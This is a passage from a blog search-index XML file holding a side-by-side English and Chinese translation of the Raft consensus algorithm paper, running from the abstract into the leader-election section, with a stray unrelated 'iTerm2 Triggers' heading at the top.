<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>译 - In Search of an Understandable Consensus Algorithm (Extended Version)</title>
      <link href="/2021/05/01/raft/"/>
      <url>/2021/05/01/raft/</url>
      
        <content type="html"><![CDATA[<h2 id="一、iTerm2的Triggers功能"><a href="#一、iTerm2的Triggers功能" class="headerlink" title="一、iTerm2的Triggers功能"></a>一、iTerm2的Triggers功能</h2><p>原文：<a href="https://raft.github.io/raft.pdf">In Search of an Understandable Consensus Algorithm (Extended Version)</a></p><h2 id="Abstract（摘要）"><a href="#Abstract（摘要）" class="headerlink" title="Abstract（摘要）"></a>Abstract（摘要）</h2><p>Raft is a consensus algorithm for managing a replicated log. It produces a result equivalent to (multi-)Paxos, and it is as efficient as Paxos, but its structure is different from Paxos; this makes Raft more understandable than Paxos and also provides a better foundation for building practical systems. In order to enhance understandability, Raft separates the key elements of consensus, such as leader election, log replication, and safety, and it enforces a stronger degree of coherency to reduce the number of states that must be considered. Results from a user study demonstrate that Raft is easier for students to learn than Paxos. Raft also includes a new mechanism for changing the cluster membership, which uses overlapping majorities to guarantee safety.</p><p>Raft 是一种用来管理日志复制的共识算法。它的性能和 (multi-)Paxos 是一样的，并且和Paxos一样高效，但是它的结构和 Paxos 不一样；这使得 Raft 更容易理解并且也为构建实用系统提供了更好的基础。为了增强可理解性，Raft 将共识算法分为了几个部分，例如领导选取（leader selection），日志复制（log replication）和安全性（safety），同时它使用了更强的一致性来减少了必须要考虑的状态数量。从用户学习的结果来看，Raft 比 Paxos 更容易学习。Raft 还包括了一种新的机制来动态改变集群成员，它使用重叠大多数（overlapping majorities）来保证安全。</p><h2 id="1、Introduction（介绍）"><a href="#1、Introduction（介绍）" class="headerlink" title="1、Introduction（介绍）"></a>1、Introduction（介绍）</h2><p>Consensus algorithms allow a collection of machines to work as a coherent group that can survive the failures of some of its members. Because of this, they play a key role in building reliable large-scale software systems. Paxos [15, 16] has dominated the discussion of consensus algorithms over the last decade: most implementations of consensus are based on Paxos or influenced by it, and Paxos has become the primary vehicle used to teach students about consensus.</p><p>共识算法允许一群机器像一个整体一样工作，即使其中的一些成员发生故障也不会出现问题。基于这一点，它在构建可靠的大规模软件系统的过程中起着关键的作用。Paxos[15, 16]一直主导着过去十年间对共识算法的讨论：许多共识算法的实现都是以Paxos为基础或者受到它的影响，并且Paxos已经成为了用来教授学生关于共识算法的主要工具。</p><p>Unfortunately, Paxos is quite difficult to understand, in spite of numerous attempts to make it more approachable. Furthermore, its architecture requires complex changes to support practical systems. As a result, both system builders and students struggle with Paxos.</p><p>不幸的是，Paxos太难以理解了，尽管已经做了很多尝试想使它变得更加平易近人。并且，为了方便构建实际的系统，它的结构也需要做出非常复杂的改变。因此，系统架构师和学生都对Paxos感到很痛苦。</p><p>After struggling with Paxos ourselves, we set out to find a new consensus algorithm that could provide a better foundation for system building and education. Our approach was unusual in that our primary goal was understandability: could we define a consensus algorithm for practical systems and describe it in a way that is significantly easier to learn than Paxos? Furthermore, we wanted the algorithm to facilitate the development of intuitions that are essential for system builders. It was important not just for the algorithm to work, but for it to be obvious why it works.</p><p>在我们和Paxos经历了一番痛苦挣扎之后，我们开始寻找一种新的共识算法来为系统的构建和教学提供更好的基础。我们的首要目标比较特殊，为了让它更加易于理解：我们能否为实际的系统构建一个比Paxos更加易于理解的共识算法？此外，我们希望该算法能够培养系统构建者的开发直觉。而这对系统构建者是必不可少的。重要的是不仅算法要起作用，而且要清楚它为什么会起作用。</p><p>The result of this work is a consensus algorithm called Raft. In designing Raft we applied specific techniques to improve understandability, including decomposition (Raft separates leader election, log replication, and safety) and state space reduction (relative to Paxos, Raft reduces the degree of nondeterminism and the ways servers can be inconsistent with each other). A user study with 43 students at two universities shows that Raft is significantly easier to understand than Paxos: after learning both algorithms, 33 of these students were able to answer questions about Raft better than questions about Paxos.</p><p>这项工作的结果就是一个叫做Raft的共识算法。在设计Raft的时候，我们使用了特定的技术来提高可理解性，包括分割（Raft分离了领导者选举、日志复制和安全性）以及状态空间的减少（和Paxos相比，Raft降低了不确定性的程度以及服务器之间数据不一致的方式）。在对两所大学的43名学生的用户调研后表明，Raft比Paxos更加容易理解。在同时学习了两种方法之后，其中的33名学生回答Raft的问题要比回答Paxos的更好。</p><p>Raft is similar in many ways to existing consensus algorithms (most notably, Oki and Liskov’s Viewstamped Replication [29, 22]), but it has several novel features:</p><ul><li>Strong leader: Raft uses a stronger form of leadership than other consensus algorithms. For example, log entries only flow from the leader to other servers. This simplifies the management of the replicated log and makes Raft easier to understand.</li><li>Leader election: Raft uses randomized timers to elect leaders. This adds only a small amount of mechanism to the heartbeats already required for any consensus algorithm, while resolving conflicts simply and rapidly.</li><li>Membership changes: Raft’s mechanism for changing the set of servers in the cluster uses a new joint consensus approach where the majorities of two different configurations overlap during transitions. This allows the cluster to continue operating normally during configuration changes.</li></ul><p>Raft在很多方面和现存的共识算法类似，但是它也有以下这些独特的特性：</p><ul><li>强领导者：Raft使用了比其他共识算法更强的领导形式。例如，日志条目只能从领导者流向其他服务器。这简化了对复制日志的管理，并使Raft更易于理解。</li><li>领导者选举：Raft使用随机的时钟来选举领导者。这只是在共识算法原有的心跳检测的基础上增加了少量的特殊机制。使得冲突解决变得更加简单快速。</li><li>成员变更：Raft使用了一种新的联合共识的方法来处理集群成员变更的问题，处于调整过程中的两种不同的配置集群中大多数机器会有重叠，这就使得集群在成员变换的时候依然可以继续工作。</li></ul><p>We believe that Raft is superior to Paxos and other consensus algorithms, both for educational purposes and as a foundation for implementation. It is simpler and more understandable than other algorithms; it is described completely enough to meet the needs of a practical system; it has several open-source implementations and is used by several companies; its safety properties have been formally specified and proven; and its efficiency is comparable to other algorithms.</p><p>我们相信不论是用于教学还是作为系统实现的基础，Raft都要优于Paxos和其他的共识算法。它比其他算法更简单也更加易于理解；它能完全满足实际系统的需求；它有很多开源的实现并且被很多公司使用；它的安全性已经被完全证实了；并且它的效率也完全可以和其他算法相媲美。</p><p>The remainder of the paper introduces the replicated state machine problem (Section 2), discusses the strengths and weaknesses of Paxos (Section 3), describes our general approach to understandability (Section 4), presents the Raft consensus algorithm (Sections 5–8), evaluates Raft (Section 9), and discusses related work (Section 10).</p><p>本文的第2章介绍了状态机的相关问题，第3章描述了Paxos的优缺点，第4章介绍了我们达成可理解性目标的一些方法，第5到8章详细介绍了 Raft 共识算法，第9章描述了对Raft的评估，第10章讨论了Raft相关一些成果。</p><h2 id="2、Replicated-state-machines（复制状态机）"><a href="#2、Replicated-state-machines（复制状态机）" class="headerlink" title="2、Replicated state machines（复制状态机）"></a>2、Replicated state machines（复制状态机）</h2><p>Consensus algorithms typically arise in the context of replicated state machines [37]. In this approach, state machines on a collection of servers compute identical copies of the same state and can continue operating even if some of the servers are down. Replicated state machines are used to solve a variety of fault tolerance problems in distributed systems. For example, large-scale systems that have a single cluster leader, such as GFS [8], HDFS [38], and RAMCloud [33], typically use a separate replicated state machine to manage leader election and store configuration information that must survive leader crashes. Examples of replicated state machines include Chubby [2] and ZooKeeper [11].</p><p>共识算法是在复制状态机[37]的背景下提出来的。在这个方法中，一组服务器上的状态机对同一个状态计算并产生多个完全相同的副本，这使得即使其中一些服务器崩溃了，这组服务器也还可以继续正常运行。复制状态机通常用于解决分布式系统中容错相关的一系列问题。例如，GFS[8]，HDFS[38]， RAMCloud[33]，这些拥有单一集群领导者的大规模应用系统，会使用一个独立的复制状态机来管理领导选取及存储集群配置信息来应对领导者的崩溃。复制状态机典型的例子包括 Chubby[2] 和 ZooKeeper[11]。</p><p><a href="https://cdn.bugwz.com/raft-repl-state-machine-architecture.png"><img src="https://cdn.bugwz.com/raft-repl-state-machine-architecture.png" alt="Replicated state machine architecture">Replicated state machine architecture</a></p><p>Figure 1: Replicated state machine architecture. The consensus algorithm manages a replicated log containing state machine commands from clients. The state machines process identical sequences of commands from the logs, so they produce the same outputs.</p><p>图1: 复制状态机架构。共识算法管理着一个复制日志，其中包含来自客户端的状态机命令。状态机负责处理日志中相同的命令序列，因此它们会产生相同的输出。</p><p>Replicated state machines are typically implemented using a replicated log, as shown in Figure 1. Each server stores a log containing a series of commands, which its state machine executes in order. Each log contains the same commands in the same order, so each state machine processes the same sequence of commands. Since the state machines are deterministic, each computes the same state and the same sequence of outputs.</p><p>如图1所示，复制状态机通常使用复制日志来实现。每台服务器存储一份包含一系列命令的日志，内部状态机依照日志中的命令顺序执行。因为每台机器的状态机都是确定的，所以计算将得到同样的状态和输出结果。</p><p>Keeping the replicated log consistent is the job of the consensus algorithm. The consensus module on a server receives commands from clients and adds them to its log. It communicates with the consensus modules on other servers to ensure that every log eventually contains the same requests in the same order, even if some servers fail. Once commands are properly replicated, each server’s state machine processes them in log order, and the outputs are returned to clients. As a result, the servers appear to form a single, highly reliable state machine.</p><p>共识算法的任务就是保证复制日志的一致性。服务器上的共识模块，接收来自客户端的命令，并追加到日志中。它和其它服务器上的共识模块进行通信，确保每一个服务器上的日志都包含相同顺序的相同请求，即使其中的一些服务宕机了。一旦命令被正确地复制，每个服务器的状态机就会按日志顺序处理它们，并将输出返回给客户机。结果就是服务器似乎形成了一个单一的、高度可靠的状态机。</p><p>Consensus algorithms for practical systems typically have the following properties:</p><ul><li>They ensure safety (never returning an incorrect result) under all non-Byzantine conditions, including network delays, partitions, and packet loss, duplication, and reordering.</li><li>They are fully functional (available) as long as any majority of the servers are operational and can communicate with each other and with clients. Thus, a typical cluster of five servers can tolerate the failure of any two servers. Servers are assumed to fail by stopping; they may later recover from state on stable storage and rejoin the cluster.</li><li>They do not depend on timing to ensure the consistency of the logs: faulty clocks and extreme message delays can, at worst, cause availability problems.</li><li>In the common case, a command can complete as soon as a majority of the cluster has responded to a single round of remote procedure calls; a minority of slow servers need not impact overall system performance.</li></ul><p>实际应用中的共识算法通常具有以下特性：</p><ul><li>确保非拜占庭情况下的安全性（从来不会返回一个错误的结果），包括网络的延迟、分区及数据包的丢包、冗余和乱序情况。</li><li>只要集群主体中的大多数机器能够运行，并且可以相互通信和与客户机通信，这个集群就可用。因此，一个拥有 5 台机器的集群最多可以容忍其中的 2 台的宕机。假定服务器因停止而发生了故障；它们可能稍后就会恢复稳定存储状态并重新加入集群。</li><li>不依赖于时间来确保日志的一致性：错误的时钟和极端的消息延迟在最坏的情况下会导致可用性的问题。</li><li>通常情况下，只要集群的大多数成员响应了一轮远程过程调用，命令就可以完成；少数慢速服务器不会影响总体的系统性能。</li></ul><h2 id="3、What’s-wrong-with-Paxos-（Paxos有什么问题？）"><a href="#3、What’s-wrong-with-Paxos-（Paxos有什么问题？）" class="headerlink" title="3、What’s wrong with Paxos?（Paxos有什么问题？）"></a>3、What’s wrong with Paxos?（Paxos有什么问题？）</h2><p>Over the last ten years, Leslie Lamport’s Paxos protocol [15] has become almost synonymous with consensus: it is the protocol most commonly taught in courses, and most implementations of consensus use it as a starting point. Paxos first defines a protocol capable of reaching agreement on a single decision, such as a single replicated log entry. We refer to this subset as single-decree Paxos. Paxos then combines multiple instances of this protocol to facilitate a series of decisions such as a log (multi-Paxos). Paxos ensures both safety and liveness, and it supports changes in cluster membership. Its correctness has been proven, and it is efficient in the normal case.</p><p>在过去的十年中，Leslie Lamport的Paxos协议[15]几乎成为了共识算法的代名词：它是授课中最常讲授的算法，同时也是许多共识算法实现的起点。Paxos首先定义了一个能够就单个决策达成一致的协议，例如单个复制的日志条目。我们将这个子集称为单一决策 Paxos。然后，Paxos将该协议的多个实例组合起来从而形成一系列决策，例如日志（multi-Paxos）。Paxos既保证了安全性又保证了活跃性，同时它支持集群成员角色的变更。它的正确性已被证明了并且在一般的情况下也被证明是高效的。</p><p>Unfortunately, Paxos has two significant drawbacks. The first drawback is that Paxos is exceptionally difficult to understand. The full explanation [15] is notoriously opaque; few people succeed in understanding it, and only with great effort. As a result, there have been several attempts to explain Paxos in simpler terms [16, 20, 21]. These explanations focus on the single-decree subset, yet they are still challenging. In an informal survey of attendees at NSDI 2012, we found few people who were comfortable with Paxos, even among seasoned researchers. We struggled with Paxos ourselves; we were not able to understand the complete protocol until after reading several simplified explanations and designing our own alternative protocol, a process that took almost a year.</p><p>不幸的是，Paxos有两个显著的缺点。<strong>第一个是 Paxos 太难以理解</strong>。众所周知，它的完整说明是出乎寻常的晦涩，很少有人能够完全理解它。因此，人们曾多次尝试用更简单的术语来解释Paxos[16，20，21]。虽然它们都侧重于single-decree subset的版本，但是仍然非常具有挑战性。在一项针对NSDI 2012与会者的非正式调查中，我们发现很少有人对Paxos感到舒服，即使是那些有着丰富经验的研究人员。我们自己也对Paxos感到非常痛苦，我们在阅读了几个简化版的描述以及设计了我们自己的替代协议后才能够理解完整的协议，而这整个过程持续了将近一年。</p><p>We hypothesize that Paxos’ opaqueness derives from its choice of the single-decree subset as its foundation. Single-decree Paxos is dense and subtle: it is divided into two stages that do not have simple intuitive explanations and cannot be understood independently. Because of this, it is difficult to develop intuitions about why the singledecree protocol works. The composition rules for multiPaxos add significant additional complexity and subtlety. We believe that the overall problem of reaching consensus on multiple decisions (i.e., a log instead of a single entry) can be decomposed in other ways that are more direct and obvious.</p><p>我们认为Paxos的晦涩来源于它将single-decree subset作为自己的基础。Single-decree Paxos被认为是微妙的：它被划分为两个阶段，它们没有简单直观的解释，也不能被独立理解。因此，这就导致了很难对single-decree协议是如何工作的进行联想。而multi-Paxos的组成规则（composition rule）则更加添加了复杂性。我们认为，就多项决策达成共识的总体问题（即，一个日志而不是一个条目）可以用其他更直接、更明显的方式来分解。</p><p>The second problem with Paxos is that it does not provide a good foundation for building practical implementations. One reason is that there is no widely agreedupon algorithm for multi-Paxos. Lamport’s descriptions are mostly about single-decree Paxos; he sketched possible approaches to multi-Paxos, but many details are missing. There have been several attempts to flesh out and optimize Paxos, such as [26], [39], and [13], but these differ from each other and from Lamport’s sketches. Systems such as Chubby [4] have implemented Paxos-like algorithms, but in most cases their details have not been published.</p><p>Paxos的第二个问题是<strong>它没有为构建实际的实现提供良好的基础</strong>。一大原因是multi-Paxos没有一个广受认可的算法。Lamport的描述主要针对的是single-decree Paxos；它为multi-Paxos提供了一个大概的框架，但是很多细节并没有提及。对于充实以及优化Paxos已经做了很多努力，例如[26]、[39]和[13]，但是它们各自之间，以及和Lamport的概述都不相同。像Chubby这样的系统已经实现了类Paxos算法，但是它的很多细节并没有公开。</p><p>Furthermore, the Paxos architecture is a poor one for building practical systems; this is another consequence of the single-decree decomposition. For example, there is little benefit to choosing a collection of log entries independently and then melding them into a sequential log; this just adds complexity. It is simpler and more efficient to design a system around a log, where new entries are appended sequentially in a constrained order. Another problem is that Paxos uses a symmetric peer-to-peer approach at its core (though it eventually suggests a weak form of leadership as a performance optimization). This makes sense in a simplified world where only one decision will be made, but few practical systems use this approach. If a series of decisions must be made, it is simpler and faster to first elect a leader, then have the leader coordinate the decisions.</p><p>此外，Paxos的架构也不利于构建实际系统；这是它按single-decree分解的另一个后果。例如，独立地选取一系列的日志条目并且将它们融合成一个顺序的日志并没有太多好处，仅仅只是增加了复杂度。相反，构建一个围绕按顺序扩展日志的系统是更简单和高效的。Paxos的另一个问题是它将对称的点对点（peer-to-peer）作为核心（虽然在最后为了优化性能建议了一种弱领导者形式）。这在只需要做一个决策的简单场景中是可行的，但是很少有实际的系统会使用这种方法。如果需要进行一系列的决策，那么先选择一个领导者，然后再让领导者去协调决策会更加简单快捷。</p><p>As a result, practical systems bear little resemblance to Paxos. Each implementation begins with Paxos, discovers the difficulties in implementing it, and then develops a significantly different architecture. This is timeconsuming and error-prone, and the difficulties of understanding Paxos exacerbate the problem. Paxos’ formulation may be a good one for proving theorems about its correctness, but real implementations are so different from Paxos that the proofs have little value. The following comment from the Chubby implementers is typical:</p><ul><li>There are significant gaps between the description of the Paxos algorithm and the needs of a real-world system. . . . the final system will be based on an unproven protocol [4].</li></ul><p>因此，实际构建出的系统与Paxos几乎没有相似之处。每个实现都从Paxos开始，然后发现实现起来很困难，于是最后开发出了一个完全不同的架构。这是极其费时并且容易出错的，而Paxos的难以理解则更加加剧了这个问题。Paxos的正确性理论很好证明，但是实际的实现和Paxos太过不同，因此这些证明就没什么价值了。接下来这段来自Chubby的评论是非常典型的：</p><ul><li>Paxos算法的描述和现实世界的系统需求之间有着巨大的矛盾…而最终实现的系统都将建立在一个未经证明的协议之上[4]。</li></ul><p>Because of these problems, we concluded that Paxos does not provide a good foundation either for system building or for education. Given the importance of consensus in large-scale software systems, we decided to see if we could design an alternative consensus algorithm with better properties than Paxos. Raft is the result of that experiment.</p><p>因为这些问题的存在，我们得出这样的结论，Paxos并没有为实际系统的构建或者是教学提供一个很好的基础。基于在大规模软件系统中共识的重要性，我们决定尝试能否设计出另外一种比Paxos有着更好性质的共识算法。而Raft就是我们实验得到的结果。</p><h2 id="4、Designing-for-understandability（可理解性设计）"><a href="#4、Designing-for-understandability（可理解性设计）" class="headerlink" title="4、Designing for understandability（可理解性设计）"></a>4、Designing for understandability（可理解性设计）</h2><p>We had several goals in designing Raft: it must provide a complete and practical foundation for system building, so that it significantly reduces the amount of design work required of developers; it must be safe under all conditions and available under typical operating conditions; and it must be efficient for common operations. But our most important goal—and most difficult challenge—was understandability. It must be possible for a large audience to understand the algorithm comfortably. In addition, it must be possible to develop intuitions about the algorithm, so that system builders can make the extensions that are inevitable in real-world implementations.</p><p>我们在设计Raft的时候有以下几个目标：它必须为系统构建提供一个完整并实际可行的基础，这将大大减少系统开发者的设计工作；它必须在任何情况下都能够确保安全性，并且保证在典型应用场景下的可用性；它在通常的应用操作中必须是高效的。另外，最重要的一点，也是最具挑战性的一点是它必须易于理解，从而使广大的读者能够很好的理解这个算法。 并且要能够培养出对这个算法的直觉（develop intuitions），从而让系统构建者能够在实际实现中做出必要的扩展。</p><p>There were numerous points in the design of Raft where we had to choose among alternative approaches. In these situations we evaluated the alternatives based on understandability: how hard is it to explain each alternative (for example, how complex is its state space, and does it have subtle implications?), and how easy will it be for a reader to completely understand the approach and its implications?</p><p>在设计Raft的很多节点上，我们需要在很多可选方法之间做出选择。在这些情况下，我们基于可理解性来评估这些方法：每一个可选方案的描述是否困难（比如，它的状态空间的复杂度是多少，以及它是否有其他的理解歧义？）以及读者是否能轻松地完全理解这种方法。</p><p>We recognize that there is a high degree of subjectivity in such analysis; nonetheless, we used two techniques that are generally applicable. The first technique is the well-known approach of problem decomposition: wherever possible, we divided problems into separate pieces that could be solved, explained, and understood relatively independently. For example, in Raft we separated leader election, log replication, safety, and membership changes.</p><p>后来我们意识到这种分析方法具有很强的主观性；于是我们使用了两种方法让分析变得更具通用性。<strong>第一种是众所周知的问题分解方法：在可能的情况下，我们将问题划分为可以相对独立地解决、解释和理解的部分。</strong>例如，在Raft中，我们分离了领导者选举、日志复制、安全性和成员变更。</p><p>Our second approach was to simplify the state space by reducing the number of states to consider, making the system more coherent and eliminating nondeterminism where possible. Specifically, logs are not allowed to have holes, and Raft limits the ways in which logs can become inconsistent with each other. Although in most cases we tried to eliminate nondeterminism, there are some situations where nondeterminism actually improves understandability. In particular, randomized approaches introduce nondeterminism, but they tend to reduce the state space by handling all possible choices in a similar fashion (“choose any; it doesn’t matter”). We used randomization to simplify the Raft leader election algorithm.</p><p>我们的<strong>第二种方法是通过减少要考虑的状态来简化状态空间，使系统更加一致，并且在可能的情况下消除不确定性。</strong>具体来说，日志不允许存在空洞，Raft限制了日志之间存在不一致的可能。尽管在大多数情况下，我们试图消除不确定性，但在某些情况下，不确定性实际上提高了可理解性。特别是随机化方法引入了不确定性，但是它们倾向于通过以类似的方式处理所有可能的选择来减少状态空间（选择哪一个并不重要）。我们使用随机化来简化了Raft的领导者选举算法。</p><h2 id="5、The-Raft-consensus-algorithm（Raft公式算法）"><a href="#5、The-Raft-consensus-algorithm（Raft公式算法）" class="headerlink" title="5、The Raft consensus algorithm（Raft公式算法）"></a>5、The Raft consensus algorithm（Raft公式算法）</h2><p>Raft is an algorithm for managing a replicated log of the form described in Section 2. Figure 2 summarizes the algorithm in condensed form for reference, and Figure 3 lists key properties of the algorithm; the elements of these figures are discussed piecewise over the rest of this section.</p><p>Raft是用于管理文章第二部分描述的复制日志算法。图2是对Raft的简要描述；图3罗列了算法的一些重要属性；接下来将会对图示部分进行分段讨论。</p><p><a href="https://cdn.bugwz.com/raft-state.png"><img src="https://cdn.bugwz.com/raft-state.png" alt="State"></a></p><p><a href="https://cdn.bugwz.com/raft-state.png">State</a></p><p><a href="https://cdn.bugwz.com/raft-request-vote-rpc.png"><img src="https://cdn.bugwz.com/raft-request-vote-rpc.png" alt="RequestVote RPC">RequestVote RPC</a><a href="https://cdn.bugwz.com/raft-append-entries-rpc.png"><img src="https://cdn.bugwz.com/raft-append-entries-rpc.png" alt="AppendEntries RPC">AppendEntries RPC</a><a href="https://cdn.bugwz.com/raft-rule-for-servers.png"><img src="https://cdn.bugwz.com/raft-rule-for-servers.png" alt="Rules For Servers">Rules For Servers</a></p><p>Figure 2: A condensed summary of the Raft consensus algorithm (excluding membership changes and log compaction). The server behavior in the upper-left box is described as a set of rules that trigger independently and repeatedly. Section numbers such as §5.2 indicate where particular features are discussed. A formal specification [31] describes the algorithm more precisely.</p><p>图2：Raft共识算法的简明摘要（不包括成员变更和日志压缩）。左上框中的服务器行为被描述为一组独立且可重复触发的规则。例如第5.2节指明讨论特定特征的位置。形式规范[31]更精确地描述了该算法。</p><p><a href="https://cdn.bugwz.com/raft-properties.png"><img src="https://cdn.bugwz.com/raft-properties.png" alt="Raft Properties">Raft Properties</a></p><p>Figure 3: Raft guarantees that each of these properties is true at all times. The section numbers indicate where each property is discussed.</p><p>图3：Raft保证这些属性在任何时候都是正确的。章节号是讨论每个属性的位置。</p><p>Raft implements consensus by first electing a distinguished leader, then giving the leader complete responsibility for managing the replicated log. The leader accepts log entries from clients, replicates them on other servers, and tells servers when it is safe to apply log entries to their state machines. Having a leader simplifies the management of the replicated log. For example, the leader can decide where to place new entries in the log without consulting other servers, and data flows in a simple fashion from the leader to other servers. A leader can fail or become disconnected from the other servers, in which case a new leader is elected.</p><p>Raft首先选举出一个唯一的领导者来实现共识，并赋予完全的管理复制日志的责任。领导者接收来自客户端的日志条目并复制到其它服务器，同时将日志条目追加到自身日志，然后告知其他服务器可以应用日志条目到状态机。领导者大大简化了日志复制的管理。例如，领导者可以自主决定日志条目的追加位置，数据以一种简单的方式从领导者流向其它服务器。领导者可能会宕机或与其他服务器断开连接，在这种情况下，将要选出新的领导者。</p><p>Given the leader approach, Raft decomposes the consensus problem into three relatively independent subproblems, which are discussed in the subsections that follow:</p><ul><li>Leader election: a new leader must be chosen when an existing leader fails (Section 5.2).</li><li>Log replication: the leader must accept log entries from clients and replicate them across the cluster, forcing the other logs to agree with its own (Section 5.3).</li><li>Safety: the key safety property for Raft is the State Machine Safety Property in Figure 3: if any server has applied a particular log entry to its state machine, then no other server may apply a different command for the same log index. Section 5.4 describes how Raft ensures this property; the solution involves an additional restriction on the election mechanism described in Section 5.2.</li></ul><p>After presenting the consensus algorithm, this section discusses the issue of availability and the role of timing in the system.</p><p>鉴于领导者方法，Raft将共识问题分解为三个相对独立的子问题，这些子问题将在下面的小节中讨论：</p><ul><li><strong>领导者选举</strong>：现有的领导者宕机后将选举新的领导者（第5.2节）。</li><li><strong>日志复制</strong>：领导者必须能够接受来自客户端的日志条目，并复制到集群中的其它服务器，强制其他服务器的日志与自己的日志保持一致（第5.3节）。</li><li><strong>安全性</strong>：Raft的关键安全性属性是图3中的状态机的安全性属性：如果任何服务器已将特定的日志条目应用于其状态机，那么其他服务器都不能对同一个日志索引应用不同的命令。第5.4节描述了Raft如何确保该特性；解决方案中包括了对第5.2节所述选举机制的额外限制。</li></ul><p>在介绍了共识算法之后，本节讨论了可用性问题以及时机（the role of timing）在系统中的作用。</p><h3 id="5-1、Raft-basics（Raft基础）"><a href="#5-1、Raft-basics（Raft基础）" class="headerlink" title="5.1、Raft basics（Raft基础）"></a>5.1、Raft basics（Raft基础）</h3><p>A Raft cluster contains several servers; five is a typical number, which allows the system to tolerate two failures. At any given time each server is in one of three states: leader, follower, or candidate. In normal operation there is exactly one leader and all of the other servers are followers. Followers are passive: they issue no requests on their own but simply respond to requests from leaders and candidates. The leader handles all client requests (if a client contacts a follower, the follower redirects it to the leader). The third state, candidate, is used to elect a new leader as described in Section 5.2. Figure 4 shows the states and their transitions; the transitions are discussed below.</p><p>一个 Raft 集群包括若干个服务器；对于一个典型的拥有 5 个服务器的集群来说，最多能够容忍 2 台服务器宕机。集群运行期间，服务器都会处于三个状态之中：领导者（Leader） 、跟随者（Follower）、候选者（Candidate）。正常情况下，只有一个服务器处于领导者状态，其它的都是跟随者。跟随者是被动的：他们不发送任何请求，只是简单的响应来自领导者和候选者的请求。领导者来处理所有来自客户端的请求（如果一个客户端与跟随者进行通信，跟随者会将请求信息转发给领导者）。候选者是用来选取新的领导者的。图-4 阐述了这些状态及它们之间的转换。</p><p><a href="https://cdn.bugwz.com/raft-server-states.png"><img src="https://cdn.bugwz.com/raft-server-states.png" alt="Raft Server States">Raft Server States</a></p><p>Figure 4: Server states. Followers only respond to requests from other servers. If a follower receives no communication, it becomes a candidate and initiates an election. A candidate that receives votes from a majority of the full cluster becomes the new leader. Leaders typically operate until they fail.</p><p>图4：服务器状态。跟随者只响应来自其他服务器的请求。如果一个追随者没有收到任何信息，它就会成为一个候选人并发起选举。一个获得集群中多数选票的候选者会成为新的领导者。领导者通常会一直工作直到宕机。</p><p>Raft divides time into terms of arbitrary length, as shown in Figure 5. Terms are numbered with consecutive integers. Each term begins with an election, in which one or more candidates attempt to become leader as described in Section 5.2. If a candidate wins the election, then it serves as leader for the rest of the term. In some situations an election will result in a split vote. In this case the term will end with no leader; a new term (with a new election) will begin shortly. Raft ensures that there is at most one leader in a given term.</p><p>Raft将时间划分为任意长度的任期（Term），如图5所示。任期用连续的整数来命名。每一个任期的选举开始时，一名或多名候选者会试图成为第5.2节所述的领导者。如果候选者在选举中获胜，那么它将在余下的任期内担任领导者。在某些情况下，选举会导致分裂投票。在这种情况下，任期将以无领导者而结束；新的任期会随即开始。Raft确保在给定的任期内最多有一个领导者。</p><p><a href="https://cdn.bugwz.com/raft-terms.png"><img src="https://cdn.bugwz.com/raft-terms.png" alt="Raft Terms">Raft Terms</a></p><p>Figure 5: Time is divided into terms, and each term begins with an election. After a successful election, a single leader manages the cluster until the end of the term. Some elections fail, in which case the term ends without choosing a leader. The transitions between terms may be observed at different times on different servers.</p><p>图5：时间被划分为任期，每届任期以选举开始。在一次成功的选举之后，只有一位领导者能够管理这个集群直到任期结束。在某些选举失败的情况下，任期结束时没有选出领导者。可以在不同的服务器上，在不同的时间段内观察转换过程。</p><p>Different servers may observe the transitions between terms at different times, and in some situations a server may not observe an election or even entire terms. Terms act as a logical clock [14] in Raft, and they allow servers to detect obsolete information such as stale leaders. Each server stores a current term number, which increases monotonically over time. Current terms are exchanged whenever servers communicate; if one server’s current term is smaller than the other’s, then it updates its current term to the larger value. If a candidate or leader discovers that its term is out of date, it immediately reverts to follower state. If a server receives a request with a stale term number, it rejects the request.</p><p>可以观察到不同的服务器会在不同的时间进行任期（Term）的转换。在某些情况下，甚至在整个任期中，服务器可能不会观察到选举。任期（Term）作为Raft的逻辑时钟[14]，它们允许服务器检测过期的信息，例如过期的领导者。每个服务器都存储着一个当前任期数字，数字随任期单调递增，服务器间通信时会相互交换任期信息。如果一个服务器的任期信息比其它的服务器小，它就会更新自己的任期到当前较大的任期。如果领导者或者候选者发现自己的任期信息已经过期，那么它们会立即转换状态为跟随者。当一个服务器收到一个包含过期的任期信息的请求时，会拒绝这个请求。</p><p>Raft servers communicate using remote procedure calls (RPCs), and the basic consensus algorithm requires only two types of RPCs. RequestVote RPCs are initiated by candidates during elections (Section 5.2), and AppendEntries RPCs are initiated by leaders to replicate log entries and to provide a form of heartbeat (Section 5.3). Section 7 adds a third RPC for transferring snapshots between servers. Servers retry RPCs if they do not receive a response in a timely manner, and they issue RPCs in parallel for best performance.</p><p>Raft服务器间通过RPC方式进行通信，基础的共识算法只需要两种类型的RPC：**请求投票RPCs（RequestVote RPCs）**是候选者在选举期间发起的，并在选举时使用（第5.2节）和 **复制日志条目 RPCs（Append Entries RPCs）** 是由领导者发起的，在复制日志及心跳检测时使用（第5.3节）。第7节中新增了用于**在服务器之间传输快照的第三个RPC**。如果服务器没有及时收到响应，则会重试RPC，通过并行发出RPC以获得最佳性能。</p><h3 id="5-2、Leader-election（领导者选举）"><a href="#5-2、Leader-election（领导者选举）" class="headerlink" title="5.2、Leader election（领导者选举）"></a>5.2、Leader election（领导者选举）</h3><p>Raft uses a heartbeat mechanism to trigger leader election. When servers start up, they begin as followers. A server remains in follower state as long as it receives valid RPCs from a leader or candidate. Leaders send periodic heartbeats (AppendEntries RPCs that carry no log entries) to all followers in order to maintain their authority. If a follower receives no communication over a period of time called the election timeout, then it assumes there is no viable leader and begins an election to choose a new leader.</p><p>Raft使用心跳机制来触发领导者选举。当服务器启动时，它们会处于跟随者的状态。并且保持这种状态直到接收到来自领导者或者候选者的合法RPCs。领导者会定期向所有追随者发送心跳信号（AppendEntries RPCs 是不携带日志条目的RPC），以保持它们的领导者地位。如果一个跟随者在选举超时的时间内没有收到任何通信，那么它就假定没有有效的领导者，并开始新一轮的选举以选择出新的领导人。</p><p>To begin an election, a follower increments its current term and transitions to candidate state. It then votes for itself and issues RequestVote RPCs in parallel to each of the other servers in the cluster. A candidate continues in this state until one of three things happens: (a) it wins the election, (b) another server establishes itself as leader, or © a period of time goes by with no winner. These outcomes are discussed separately in the paragraphs below.</p><p>为了开始进行选举，跟随者会增加其当前任期并切换到候选者状态。然后它为自己投票，并向集群中的其他服务器并行发出请求投票请求（RequestVote 